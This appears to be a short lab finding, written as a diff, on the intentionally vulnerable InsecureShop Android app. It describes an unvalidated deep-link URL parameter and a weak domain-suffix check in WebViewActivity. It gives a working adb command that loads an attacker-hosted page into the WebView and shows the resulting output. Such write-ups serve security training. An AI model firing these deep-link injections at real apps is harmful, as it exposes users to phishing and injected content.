@@ -1,0 +1,8 @@
+# custom-scheme deep link -> arbitrary WebView URL (no validation)
+## WebViewActivity url handling (decompiled):
+path '/web'     : data = uri.getQueryParameter("url")   // NO validation -> loadUrl(data)
+path '/webview' : url loaded only if endsWith("insecureshopapp.com")   // weak, bypassable
+## trigger (browsable custom scheme):
+adb shell am start -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://10.0.2.2:8009/attacker.html"
+## result: WebViewActivity rendered attacker page; Prefs.data recorded the loaded URL:
+name="data">http://10.0.2.2:8009/attacker.html
